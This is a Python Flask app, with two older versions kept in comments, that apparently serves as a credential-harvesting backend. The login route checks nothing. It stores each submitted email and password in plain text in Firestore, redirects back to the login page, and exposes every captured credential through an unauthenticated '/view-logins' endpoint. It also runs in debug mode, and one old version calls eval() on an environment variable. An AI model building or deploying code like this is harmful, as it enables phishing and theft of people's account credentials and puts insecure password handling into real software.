import os
import json
from flask import Flask, render_template, request, redirect, url_for, jsonify
import firebase_admin
from firebase_admin import credentials, firestore

# Initialize Flask app
app = Flask(__name__)

# Use environment variable to load Firebase service account credentials
firebase_creds = os.getenv('FIREBASE_SERVICE_ACCOUNT')

if firebase_creds:
    try:
        # Parse the JSON safely using json.loads()
        cred = credentials.Certificate(json.loads(firebase_creds))
        firebase_admin.initialize_app(cred)
        
        # Initialize Firestore
        db = firestore.client()
    except Exception as e:
        print(f"Failed to initialize Firebase: {e}")
else:
    print("Firebase credentials not found.")

# Route for the login page
@app.route('/')
def login():
    return render_template('index.html')

# Route to handle login form submission
@app.route('/login', methods=['POST'])
def login_post():
    try:
        email = request.form['email']
        password = request.form['password']
        
        # Save login data to Firestore in plain text (not hashed)
        db.collection('logins').add({
            'email': email,
            'password': password
        })
        
        # Redirect back to the login page after form submission
        return redirect(url_for('login'))
    
    except Exception as e:
        return f"An error occurred: {e}"

# Route to view stored login data (For Testing purposes)
@app.route('/view-logins', methods=['GET'])
def view_logins():
    try:
        logins_ref = db.collection('logins')
        docs = logins_ref.stream()
        logins = {doc.id: doc.to_dict() for doc in docs}

        # Return the logins as JSON
        return jsonify(logins)
    
    except Exception as e:
        return f"An error occurred: {e}"

if __name__ == '__main__':
    app.run(debug=True)




# import os
# import json
# from flask import Flask, render_template, request, redirect, url_for
# import firebase_admin
# from firebase_admin import credentials, firestore

# # Initialize Flask app
# app = Flask(__name__)

# # Use environment variable to load Firebase service account credentials
# firebase_creds = os.getenv('FIREBASE_SERVICE_ACCOUNT')

# if firebase_creds:
#     # Parse the JSON safely using json.loads()
#     cred = credentials.Certificate(json.loads(firebase_creds))
#     firebase_admin.initialize_app(cred)
    
#     # Initialize Firestore
#     db = firestore.client()
# else:
#     print("Firebase credentials not found.")

# # Route for the login page
# @app.route('/')
# def login():
#     return render_template('index.html')

# # Route to handle login form submission
# @app.route('/login', methods=['POST'])
# def login_post():
#     email = request.form['email']
#     password = request.form['password']
    
#     # Save login data to Firestore
#     db.collection('logins').add({
#         'email': email,
#         'password': password
#     })
    
#     # Redirect back to the login page after form submission
#     return redirect(url_for('login'))

# if __name__ == '__main__':
#     app.run(debug=True)




# import os
# from flask import Flask, render_template, request, redirect, url_for
# import firebase_admin
# from firebase_admin import credentials, firestore

# # Initialize Flask app
# app = Flask(__name__)

# # Use environment variable to load Firebase service account credentials
# firebase_creds = os.getenv('FIREBASE_SERVICE_ACCOUNT')

# if firebase_creds:
#     # Load the credentials from the environment variable
#     cred = credentials.Certificate(eval(firebase_creds))
#     firebase_admin.initialize_app(cred)
#     # Initialize Firestore
#     db = firestore.client()
# else:
#     print("Firebase credentials not found.")

# # Route for the login page
# @app.route('/')
# def login():
#     return render_template('index.html')

# # Route to handle login form submission
# @app.route('/login', methods=['POST'])
# def login_post():
#     email = request.form['email']
#     password = request.form['password']

#     # Save login data to Firestore
#     db.collection('logins').add({
#         'email': email,
#         'password': password
#     })

#     # Redirect back to the login page after form submission
#     return redirect(url_for('login'))

# if __name__ == '__main__':
#     app.run(debug=True)
